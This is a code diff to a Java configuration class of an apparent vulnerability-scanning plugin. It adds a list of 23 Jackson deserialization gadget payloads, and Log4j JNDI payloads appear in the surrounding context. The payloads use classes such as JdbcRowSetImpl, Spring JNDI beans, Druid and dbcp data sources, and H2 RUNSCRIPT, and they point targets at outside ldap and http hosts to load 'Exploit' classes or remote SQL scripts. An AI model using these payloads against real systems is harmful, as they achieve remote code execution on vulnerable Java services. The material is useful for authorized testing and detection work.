@@ -36,6 +36,7 @@ public class Config {
     String timestamp;
     String topDomain;
     String fastjsonPayload;
+    String jacksonPayload;
     String log4jPayload;
     String ceyeApiKey;       // 存储CEYE APIKey（从UI配置读取）
     String ceyeApiDomain;    // 存储CEYE域名（从UI配置读取）
@@ -182,6 +183,37 @@ public class Config {
                         "\"${jndi:ldap://8%s/a}${::-}\"\n" +
                         "]",
                 domain, domain, domain, domain, domain, domain, domain, domain
+        );
+
+        // Jackson Payload（同样使用传入的domain）
+        this.jacksonPayload = String.format("[\n" +
+                        "  [\"com.sun.rowset.JdbcRowSetImpl\", {\"dataSourceName\":\"ldap://jackson1.%s/Exploit\",\"autoCommit\":\"true\"}],\n" +
+                        "  [\"org.springframework.jndi.support.SimpleJndiBeanFactory\", {\"lookup\":\"ldap://jackson2.%s/Exploit\"}],\n" +
+                        "  [\"org.springframework.context.support.ClassPathXmlApplicationContext\", {\"configLocation\":\"http://jackson3.%s/bean.xml\"}],\n" +
+                        "  [\"com.alibaba.druid.pool.DruidDataSource\", {\"url\":\"jdbc:jndi:ldap://jackson4.%s/Exploit\"}],\n" +
+                        "  [\"com.alibaba.druid.pool.DruidDataSource\", {\"jdbcUrl\":\"jdbc:jndi:ldap://jackson5.%s/Exploit\"}],\n" +
+                        "  [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:tcp://jackson6.%s/~/test\"}],\n" +
+                        "  [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://jackson7.%s/exec.sql'\"}],\n" +
+                        "  [\"org.apache.xbean.propertyeditor.JndiConverter\", {\"asText\":\"ldap://jackson8.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\", {\"properties\":{\"data_source\":\"ldap://jackson9.%s/Exploit\"}}],\n" +
+                        "  [\"org.springframework.transaction.jta.JtaTransactionManager\", {\"userTransactionName\":\"ldap://jackson10.%s/Exploit\"}],\n" +
+                        "  [\"org.springframework.transaction.jta.JtaTransactionManager\", {\"transactionManagerName\":\"ldap://jackson11.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\", {\"url\":\"jdbc:h2:tcp://jackson12.%s/~/test\"}],\n" +
+                        "  [\"org.apache.commons.dbcp2.cpdsadapter.DriverAdapterCPDS\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://jackson13.%s/exec.sql'\"}],\n" +
+                        "  [\"org.apache.commons.dbcp2.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://jackson14.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.commons.dbcp2.datasources.SharedPoolDataSource\", {\"dataSourceName\":\"ldap://jackson15.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://jackson16.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource\", {\"dataSourceName\":\"ldap://jackson17.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS\", {\"url\":\"jdbc:h2:tcp://jackson18.%s/~/test\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://jackson19.%s/exec.sql'\"}],\n" +
+                        "  [\"org.apache.commons.dbcp.datasources.SharedPoolDataSource\", {\"dataSourceName\":\"ldap://jackson20.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.commons.dbcp.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://jackson21.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource\", {\"dataSourceName\":\"ldap://jackson22.%s/Exploit\"}],\n" +
+                        "  [\"org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource\", {\"dataSourceName\":\"ldap://jackson23.%s/Exploit\"}]\n" +
+                        "]",
+                domain, domain, domain, domain, domain, domain, domain, domain, domain, domain,
+                domain, domain, domain, domain, domain, domain, domain, domain, domain, domain,
+                domain, domain, domain
         );
     }
     /***
